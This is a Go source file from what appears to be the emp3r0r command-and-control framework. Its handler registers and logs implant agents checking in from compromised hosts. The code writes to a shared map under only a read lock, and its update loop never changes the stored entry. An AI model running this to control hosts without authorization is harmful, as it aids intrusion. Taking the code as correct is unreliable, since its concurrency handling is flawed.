package server

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/cc/agent_util"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// handleAgentCheckIn processes agent check-in requests.
func handleAgentCheckIn(wrt http.ResponseWriter, req *http.Request) {
	conn, err := h2conn.Accept(wrt, req)
	defer func() {
		_ = conn.Close()
		if logging.Level >= 4 {
			logging.Debugf("handleAgentCheckIn finished")
		}
	}()
	if err != nil {
		logging.Errorf("handleAgentCheckIn: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	var target emp3r0r_def.Emp3r0rAgent
	in := json.NewDecoder(conn)
	err = in.Decode(&target)
	if err != nil {
		logging.Warningf("handleAgentCheckIn decode error: %v", err)
		return
	}
	target.From = req.RemoteAddr
	if !agent_util.IsAgentExist(&target) {
		inx := agent_util.AssignAgentIndex()
		def.AgentControlMapMutex.RLock()
		def.AgentControlMap[&target] = &def.AgentControl{Index: inx, Conn: nil}
		def.AgentControlMapMutex.RUnlock()
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(agent_util.AgentsJSON) {
			if l := agent_util.RefreshAgentLabel(&target); l != "" {
				shortname = l
			}
		}
		logging.Printf("Checked in: %s from %s, running %s", strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport), strconv.Quote(target.OS))
		// TODO: add agent to agent list
	} else {
		for a := range def.AgentControlMap {
			if a.Tag == target.Tag {
				a = &target
				break
			}
		}
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(agent_util.AgentsJSON) {
			if l := agent_util.RefreshAgentLabel(&target); l != "" {
				shortname = l
			}
		}
		if logging.Level >= 4 {
			logging.Debugf("Refreshing sysinfo for %s from %s, running %s", shortname, fmt.Sprintf("%s - %s", target.From, target.Transport), strconv.Quote(target.OS))
		}
	}
}
